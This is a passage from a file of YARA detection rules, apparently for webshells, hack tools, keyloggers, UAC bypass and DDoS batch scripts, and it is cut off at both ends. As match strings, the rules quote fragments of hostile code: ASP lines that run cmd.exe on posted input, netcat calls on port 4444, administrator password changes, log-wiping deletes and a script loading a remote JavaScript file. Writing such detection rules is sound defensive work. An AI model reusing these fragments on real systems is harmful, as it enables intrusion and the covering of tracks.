13:04:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system.dll\" fullword ascii\n      $s2 = \"set sys=server.CreateObject (\\\"system.contral\\\") \" fullword ascii\n      $s3 = \"Public Function reboot(atype As Variant)\" fullword ascii\n      $s4 = \"t& = ExitWindowsEx(1, atype)\" ascii\n      $s5 = \"atype=request(\\\"atype\\\") \" fullword ascii\n      $s7 = \"AceiveX dll\" fullword ascii\n      $s8 = \"Declare Function ExitWindowsEx Lib \\\"user32\\\" (ByVal uFlags As Long, ByVal \" ascii\n      $s10 = \"sys.reboot(atype)\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspfile1_RID2DBB : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file aspfile1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:44:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"' -- check for a command that we have posted -- '\" fullword ascii\n      $s1 = \"szTempFile = \\\"C:\\\\\\\" & oFileSys.GetTempName( )\" fullword ascii\n      $s5 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"><BODY>\" fullword ascii\n      $s6 = \"<input type=text name=\\\".CMD\\\" size=45 value=\\\"<%= szCMD %>\\\">\" fullword ascii\n      $s8 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword ascii\n      $s15 = \"szCMD = Request.Form(\\\".CMD\\\")\" fullword ascii\n   condition: \n      3 of them\n}\n\nrule Webshell_aspbackdoor_regdll_RID3208 : DEMO T1218_010 T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:47:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1218_010, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n      $s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n      $s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n      $s5 = \"Public Property Get oFS()\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspbackdoor_asp3_RID3105 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:04:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n      $s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n      $s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n      $s14 = \" Windows NT \" fullword ascii\n      $s16 = \" WIndows 2000 \" fullword ascii\n      $s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n      $s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n      $s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_aspbackdoor_asp1_RID3103 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:04:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"param = \\\"driver={Microsoft Access Driver (*.mdb)}\\\" \" fullword ascii\n      $s1 = \"conn.Open param & \\\";dbq=\\\" & Server.MapPath(\\\"scjh.mdb\\\") \" fullword ascii\n      $s6 = \"set rs=conn.execute (sql)%> \" fullword ascii\n      $s7 = \"<%set Conn = Server.CreateObject(\\\"ADODB.Connection\\\") \" fullword ascii\n      $s10 = \"<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh \" fullword ascii\n      $s15 = \"sql=\\\"select * from scjh\\\" \" fullword ascii\n   condition: \n      all of them\n}\n\nrule XYZCmd_zip_Folder_Readme_RID304A : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file Readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 12:33:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"3.xyzcmd \\\\\\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe\" fullword ascii\n      $s20 = \"XYZCmd V1.0\" fullword ascii\n   condition: \n      all of them\n}\n\nrule PassSniffer_zip_Folder_readme_RID32AF : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 14:15:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassSniffer.exe\" fullword ascii\n      $s1 = \"POP3/FTP Sniffer\" fullword ascii\n      $s2 = \"Password Sniffer V1.0\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule HKTL_BypassUacDll_6_RID2DDF : DEMO HKTL SUSP {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file BypassUacDll.aps\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"BypassUacDLL.dll\" fullword wide\n      $s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n   condition: \n      all of them\n}\n\nrule HKTL_BypassUac_EXE_RID2D6F : DEMO HKTL SUSP {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file BypassUacDll.aps\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wole32.dll\" wide\n      $s3 = \"System32\\\\migwiz\" wide\n      $s4 = \"System32\\\\migwiz\\\\CRYPTBASE.dll\" wide\n      $s5 = \"Elevation:Administrator!new:\" wide\n      $s6 = \"BypassUac\" wide\n   condition: \n      all of them\n}\n\nrule Jc_WinEggDrop_Shell_RID2E4A : DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:08:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Sniffer.dll\" fullword ascii\n      $s4 = \":Execute net.exe user Administrator pass\" fullword ascii\n      $s5 = \"Fport.exe or mport.exe \" fullword ascii\n      $s6 = \":Password Sniffering Is Running |Not Running \" fullword ascii\n      $s9 = \": The Terminal Service Port Has Been Set To NewPort\" fullword ascii\n      $s15 = \": Del www.exe                   \" fullword ascii\n      $s20 = \":Dir *.exe                    \" fullword ascii\n   condition: \n      2 of them\n}\n\nrule EditKeyLogReadMe_RID2D10 : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EditKeyLogReadMe_RID2D10.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:15:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"editKeyLog.exe KeyLog.exe,\" fullword ascii\n      $s1 = \"WinEggDrop.DLL\" fullword ascii\n      $s2 = \"nc.exe\" fullword ascii\n      $s3 = \"KeyLog.exe\" fullword ascii\n      $s4 = \"EditKeyLog.exe\" fullword ascii\n      $s5 = \"wineggdrop\" fullword ascii\n   condition: \n      3 of them\n}\n\nrule aspbackdoor_ipclear_RID2ED9 : DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file ipclear.vbs\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:32:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Set ServiceObj = GetObject(\\\"WinNT://\\\" & objNet.ComputerName & \\\"/w3svc\\\")\" fullword ascii\n      $s1 = \"wscript.Echo \\\"USAGE:KillLog.vbs LogFileName YourIP.\\\"\" fullword ascii\n      $s2 = \"Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)\" fullword ascii\n      $s3 = \"Set objNet = WScript.CreateObject( \\\"WScript.Network\\\" )\" fullword ascii\n      $s4 = \"Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Hacktools_CN_Burst_Blast_RID306D : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Blast.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:39:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:\" ascii\n      $s1 = \"@echo off\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Hacktools_CN_445_cmd_RID2E38 : CHINA DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file cmd.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:05:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $bat = \"@echo off\" fullword ascii\n      $s0 = \"cs.exe %1\" fullword ascii\n      $s2 = \"nc %1 4444\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0x68636540 and $bat at 0 and all of ( $s* )\n}\n\nrule Hacktools_CN_Burst_pass_RID302E : CHINA DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file pass.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:28:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"123456.com\" fullword ascii\n      $s1 = \"123123.com\" fullword ascii\n      $s2 = \"360.com\" fullword ascii\n      $s3 = \"123.com\" fullword ascii\n      $s4 = \"juso.com\" fullword ascii\n      $s5 = \"sina.com\" fullword ascii\n      $s7 = \"changeme\" fullword ascii\n      $s8 = \"master\" fullword ascii\n      $s9 = \"google.com\" fullword ascii\n      $s10 = \"chinanet\" fullword ascii\n      $s12 = \"lionking\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Hacktools_CN_Scan_BAT_RID2EC3 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file scan.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:28:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f %%a in (host.txt) do (\" ascii\n      $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n      $s2 = \"del host.txt /q\" fullword ascii\n      $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s4 = \"start Http.exe %%a %http%\" fullword ascii\n      $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n   condition: \n      5 of them\n}\n\nrule Tzddos_DDoS_Tool_CN_RID2E1F : CHINA DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file tzddos\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:01:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f %%a in (host.txt) do (\" ascii\n      $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n      $s2 = \"del host.txt /q\" fullword ascii\n      $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s4 = \"start Http.exe %%a %http%\" fullword ascii\n      $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n      $s6 = \"del Result.txt s2.txt s1.txt \" fullword ascii\n   condition: \n      all of them\n}\n\nrule Hacktools_CN_Burst_Thecard_RID3132 : CHINA DEMO SCRIPT SUSP T1057 {\n   meta:\n      description = \"Disclosed hacktool set - file Thecard.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 13:12:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"tasklist |find \\\"Clear.bat\\\"||start Clear.bat\" fullword ascii\n      $s1 = \"Http://www.coffeewl.com\" fullword ascii\n      $s2 = \"ping -n 2 localhost 1>nul 2>nul\" fullword ascii\n      $s3 = \"for /L %%a in (\" ascii\n      $s4 = \"MODE con: COLS=42 lines=5\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Hacktools_CN_Burst_Clear_RID305E : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Clear.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:36:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /f /s /q %systemdrive%\\\\*.log    \" fullword ascii\n      $s1 = \"del /f /s /q %windir%\\\\*.bak    \" fullword ascii\n      $s4 = \"del /f /s /q %systemdrive%\\\\*.chk    \" fullword ascii\n      $s5 = \"del /f /s /q %systemdrive%\\\\*.tmp    \" fullword ascii\n      $s8 = \"del /f /q %userprofile%\\\\COOKIES s\\\\*.*    \" fullword ascii\n      $s9 = \"rd /s /q %windir%\\\\temp & md %windir%\\\\temp    \" fullword ascii\n      $s11 = \"del /f /s /q %systemdrive%\\\\recycled\\\\*.*    \" fullword ascii\n      $s12 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temp\\\\*.*\\\"    \" fullword ascii\n      $s19 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temporary Internet Files\\\\*.*\\\"   \" ascii\n   condition: \n      5 of them\n}\n\nrule Hacktools_CN_Burst_Start_RID3085 : CHINA DEMO SCRIPT SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Start.bat - DoS tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-20\"\n      tags = \"CHINA, DEMO, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f \\\"eol= tokens=1,2 delims= \\\" %%i in (ip.txt) do (\" ascii\n      $s1 = \"Blast.bat /r 600\" fullword ascii\n      $s2 = \"Blast.bat /l Blast.bat\" fullword ascii\n      $s3 = \"Blast.bat /c 600\" fullword ascii\n      $s4 = \"start Clear.bat\" fullword ascii\n      $s5 = \"del Result.txt\" fullword ascii\n      $s6 = \"s syn %%i %%j 3306 /save\" fullword ascii\n      $s7 = \"start Thecard.bat\" fullword ascii\n      $s10 = \"setlocal enabledelayedexpansion\" fullword ascii\n   condition: \n      5 of them\n}\n\nrule Webshell_and_Exploit_CN_APT_HK_RID3243 : APT CHINA DEMO EXPLOIT T1505_003 WEBSHELL Webshell {\n   meta:\n      description = \"Webshell and Exploit Code in relation with APT against Honk Kong protesters\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 13:57:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXPLOIT, T1505_003, WEBSHELL, Webshell\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"<script language=javascript src=http://java-se.com/o.js</script>\" fullword\n      $s0 = \"<span style=\\\"font:11px Verdana;\\\">Password: </span><input name=\\\"password\\\" type=\\\"password\\\" size=\\\"20\\\">\" \n      $s1 = \"<input type=\\\"hidden\\\" name=\\\"doing\\\" value=\\\"login\\\">\" \n   condition: \n      $a0 or ( all of ( $s* ) )\n}\n\nrule JSP_Browser_APT_webshell_RID303A : APT DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 12:30:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1a = \"private static final String[] COMMAND_INTERPRETER = {\\\"\" ascii\n      $a1b = \"cmd\\\", \\\"/C\\\"}; // Dos,Windows\" ascii\n      $a2 = \"Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));\" ascii\n      $a3 = \"ret.append(\\\"!!!! Process has timed out, destroyed !!!!!\\\");\" ascii\n   condition: \n      all of them\n}\n\nrule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1059 T1059_001 {\n   meta:\n      description = \"Detects a Powershell version of the Netcat network hacking tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 10:53:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[ValidateRange(1, 65535)]\" fullword\n      $s1 = \"$Client = New-Object -TypeName System.Net.Sockets.TcpClient\" fullword\n      $s2 = \"$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize\" fullword\n   condition: \n      all of them\n}\n\nrule HKTL_DllInjection_RID2D62 : DEMO HKTL T1055_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file DllInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1055_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\BDoor\\\\DllInjecti\" \n   condition: \n      all of them\n}\n\nrule HKTL_Mithril_v1_45_Mithril_RID3082 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Mithril.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"cress.exe\" \n      $s7 = \"\\\\Debug\\\\Mithril.\" \n   condition: \n      all of them\n}\n\nrule HKTL_hkshell_hkrmv_RID2E15 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hkrmv.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"/THUMBPOSITION7\" \n      $s6 = \"\\\\EvilBlade\\\\\" \n   condition: \n      all of them\n}\n\nrule Webshell_FeliksPack3___PHP_Shells_phpft_RID3606 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpft.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 16:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"PHP Files Thief\" \n      $s11 = \"http://www.4ngel.net\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_indexer_RID2FAE : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file indexer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input type=\\\"r\" \n   condition: \n      all of them\n}\n\nrule Webshell_r57shell_RID2D9C : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s11 = \" $_POST['cmd']=\\\"echo \\\\\\\"Now script try connect to\" \n   condition: \n      all of them\n}\n\nrule HKTL_bdcli100_RID2B32 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file bdcli100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:56:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"unable to connect to \" \n      $s8 = \"backdoor is corrupted on \" \n   condition: \n      all of them\n}\n\nrule HKTL_HYTop2006_rar_Folder_2006X2_RID314F : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006X2.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Powered By \" \n      $s3 = \" \\\" onClick=\\\"this.form.sharp.name=this.form.password.value;this.form.action=this.\" \n   condition: \n      all of them\n}\n\nrule HKTL_rdrbs084_RID2B5C : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file rdrbs084.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Create mapped port. You have to specify domain when using HTTP type.\" \n      $s8 = \"<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET\" \n   condition: \n      all of them\n}\n\nrule Webshell_eBayId_index3_RID2F7E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file index3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$err = \\\"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\\\\\"You\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_phvayv_RID2F5D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phvayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"wrap=\\\"OFF\\\">XXXX</textarea></font><font face\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_casus15_2_RID2FD5 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file casus15.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy ( $dosya_gonder\" \n   condition: \n      all of them\n}\n\nrule Webshell_installer_RID2E74 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file installer.cmd\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:15:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Restore Old Vanquish\" \n      $s4 = \"ReInstall Vanquish\" \n   condition: \n      all of them\n}\n\nrule Webshell_FSO_s_remview_2_RID304F : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file remview.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:34:21\"\n      score = 75\n      customer = 